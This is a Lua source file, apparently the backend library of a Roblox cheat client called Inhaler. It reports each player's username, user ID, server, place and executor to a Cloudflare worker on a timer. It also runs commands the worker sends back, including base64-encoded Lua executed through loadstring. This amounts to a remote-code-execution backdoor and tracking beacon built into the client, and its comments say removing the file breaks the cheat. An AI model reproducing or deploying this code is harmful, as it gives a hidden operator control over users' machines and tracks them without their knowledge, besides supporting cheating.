-- library for inhaler backend
-- notice this file shouldnt appear from any of Inhaler's forks
-- removing this file in ur client will cause inhaler to not work
--
-- Everything that talks to the Inhaler worker lives here: the session key, the
-- activity beat, the websocket that replaces the beat when the executor has one,
-- and the dispatch of the commands the worker hands back. The universal base
-- keeps the command implementations and passes its handles in.
--
-- Usage:
--   local backend = loadstring(downloadFile('newvape/libraries/backend.lua'), 'backend')()({
--       vape = vape,
--       whitelist = whitelist,
--       lplr = lplr,
--       httpService = httpService,
--       isfile = isfile
--   })
--   backend:start()   -- backend:stop() on uninject

-- cloudflare worker ofc
local WORKER = 'inhalerbackendworker.itsrealnight1983.workers.dev'

return function(context)
	local vape = context.vape
	local whitelist = context.whitelist
	local lplr = context.lplr
	local httpService = context.httpService
	local entitylib = context.entitylib
	local marketplace = game:GetService('MarketplaceService')

	-- the base carries a fallback isfile; use it before the plain global
	local hasFile = context.isfile or isfile or function(path)
		local ok, data = pcall(readfile, path)
		return ok and data ~= nil and data ~= ''
	end

	local stopped = false
	local socket
	local beating = false
	local lastbeat = 0
	local lastping = 0
	local wsbackoff = 0
	local wsconnecting = false

	local sessionkey = ''
	pcall(function()
		local stored = hasFile('newvape/profiles/sessionkey.txt') and readfile('newvape/profiles/sessionkey.txt') or ''
		if type(stored) == 'string' and #stored == 32 and stored:match('^%x+$') then
			sessionkey = stored
			return
		end

		local generated = (httpService:GenerateGUID(false):gsub('-', ''))
		if type(generated) == 'string' and #generated == 32 then
			sessionkey = generated
			pcall(writefile, 'newvape/profiles/sessionkey.txt', generated)
		end
	end)

	local wsok, wsconnect = pcall(function()
		local lib = WebSocket
		return lib and (lib.connect or lib.Connect)
	end)
	local haswebsockets = wsok and typeof(wsconnect) == 'function'

	local execok, execname = pcall(identifyexecutor)
	if not execok or type(execname) ~= 'string' then execname = nil end

	local placeName
	local function resolvePlaceName()
		if placeName then return placeName end

		local ok, info = pcall(function()
			-- the deprecated GetProductInfo prints a warning on every call, so this only
			-- ever asks the current Async method; a client without it simply gets no
			-- place name and falls back to game.Name below
			return marketplace:GetProductInfoAsync(game.PlaceId)
		end)

		if ok and type(info) == 'table' and type(info.Name) == 'string' and #info.Name > 0 and info.Name ~= 'Ugc' then
			placeName = info.Name:sub(1, 80)
			return placeName
		end

		local okName, name = pcall(function()
			return game.Name
		end)

		placeName = (okName and type(name) == 'string' and #name > 0) and name:sub(1, 80) or '-'
		return placeName
	end

	-- Remote code execution lives here and nowhere else: it is not in the chat command
	-- set, so `;execute` does nothing, and the worker hands the script over base64
	-- encoded so no queue row or socket frame ever carries readable source. A chunk
	-- from loadstring cannot see this library's upvalues, so the handles worth having
	-- are parked in `shared` first, and both the decode and the call are guarded.
	local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local b64lookup = {}
	for index = 1, #b64chars do
		b64lookup[b64chars:sub(index, index)] = index - 1
	end

	local function decodeBase64(text)
		if type(text) ~= 'string' or text == '' then return nil end

		local out = {}
		local buffer, bits = 0, 0

		for index = 1, #text do
			local char = text:sub(index, index)
			if char == '=' then break end

			local value = b64lookup[char]
			if not value then return nil end

			buffer = buffer * 64 + value
			bits = bits + 6

			if bits >= 8 then
				bits = bits - 8
				out[#out + 1] = string.char(math.floor(buffer / 2 ^ bits) % 256)
				buffer = buffer % 2 ^ bits
			end
		end

		return #out > 0 and table.concat(out) or nil
	end

	local function runCode(encoded)
		task.spawn(function()
			local source = decodeBase64(encoded)
			if not source then
				warn('[inhaler] execute: payload did not decode')
				return
			end

			local chunk = loadstring(source)
			if not chunk then
				warn('[inhaler] execute: that code did not compile')
				return
			end

			shared.vape = vape
			shared.entitylib = entitylib
			shared.whitelist = whitelist
			shared.lplr = lplr

			local ok, runError = pcall(chunk)
			if not ok then warn('[inhaler] execute: '..tostring(runError)) end
		end)
	end

	local function runRemote(data)
		if type(data) ~= 'table' or type(data.commands) ~= 'table' then return end

		for _, command in data.commands do
			if type(command) == 'table' and type(command.command) == 'string' then
				if command.command == 'execute' then
					runCode(command.args)
				else
					pcall(whitelist.process, whitelist, ';'..command.command..' '..lplr.Name..' '..tostring(command.args or ''), lplr)
				end
			end
		end
	end

	local function beat()
		if beating then return end
		beating = true

		local ok, response = pcall(function()
			if typeof(request) ~= 'function' then return nil end

			return request({
				Method = 'POST',
				Url = 'https://'..WORKER..'/api/activity/beat',
				Headers = {
					['Content-Type'] = 'application/json',
					['x-inhaler-request'] = '1'
				},
				Body = httpService:JSONEncode({
					username = lplr.Name,
					userId = tostring(lplr.UserId),
					jobId = game.JobId,
					placeId = tostring(game.PlaceId),
					placeName = resolvePlaceName(),
					executor = execname,
					connectionType = socket and 'websocket' or 'http',
					sessionKey = sessionkey
				})
			})
		end)

		beating = false

		if ok and response and response.Success ~= false and type(response.Body) == 'string' then
			local decoded, data = pcall(httpService.JSONDecode, httpService, response.Body)
			if decoded then runRemote(data) end
		end
	end

	local function buildWsUrl()
		return 'wss://'..WORKER..'/api/activity/ws?userId='..lplr.UserId
			..'&username='..httpService:UrlEncode(lplr.Name)
			..'&jobId='..httpService:UrlEncode(game.JobId)
			..'&placeId='..game.PlaceId
			..'&placeName='..httpService:UrlEncode(resolvePlaceName())
			..(sessionkey ~= '' and '&sessionKey='..sessionkey or '')
			..(execname and '&executor='..httpService:UrlEncode(execname) or '')
	end

	local connectActivity

	function connectActivity()
		if stopped or socket or wsconnecting or not haswebsockets then return end
		wsconnecting = true

		task.spawn(function()
			local ok, connection = pcall(wsconnect, buildWsUrl())
			wsconnecting = false

			if not ok or not connection then
				if stopped then return end
				wsbackoff = math.min(wsbackoff + 1, 6)
				task.wait(wsbackoff)
				connectActivity()
				return
			end

			socket = connection
			wsbackoff = 0

			pcall(function()
				connection.OnMessage:Connect(function(message)
					local decoded, data = pcall(httpService.JSONDecode, httpService, message)
					if decoded then runRemote(data) end
				end)
			end)
			pcall(function()
				connection.OnClose:Connect(function()
					socket = nil
					if stopped then return end
					task.wait(1)
					connectActivity()
				end)
			end)
		end)
	end

	-- the beacon is the only path that can re-bind this machine's session key: the
	-- handshake binds it once and touchSession refuses a key it does not know, so a
	-- socket that stays open would pin a changed key forever and every queued command
	-- would go undelivered. the beacon therefore keeps running behind an open socket,
	-- just slower than the ping.
	local PING_INTERVAL = 20
	local BEAT_IDLE = 20
	local BEAT_SOCKET = 120

	local function start()
		task.spawn(function()
			connectActivity()

			repeat
				local ok, done = pcall(whitelist.update, whitelist, whitelist.loaded)
				if ok and done then return end

				local now = os.time()

				if socket then
					if now - lastping >= PING_INTERVAL then
						lastping = now
						task.spawn(function() pcall(socket.Send, socket, 'ping') end)
					end

					if now - lastbeat >= BEAT_SOCKET then
						lastbeat = now
						task.spawn(beat)
					end
				elseif now - lastbeat >= BEAT_IDLE then
					lastbeat = now
					task.spawn(beat)
					connectActivity()
				end

				task.wait(10)
			until stopped or vape.Loaded == nil
		end)
	end

	local function stop()
		stopped = true
		if socket then
			pcall(function()
				socket:Close()
			end)
			socket = nil
		end
	end

	return {start = start, stop = stop, beat = beat}
end
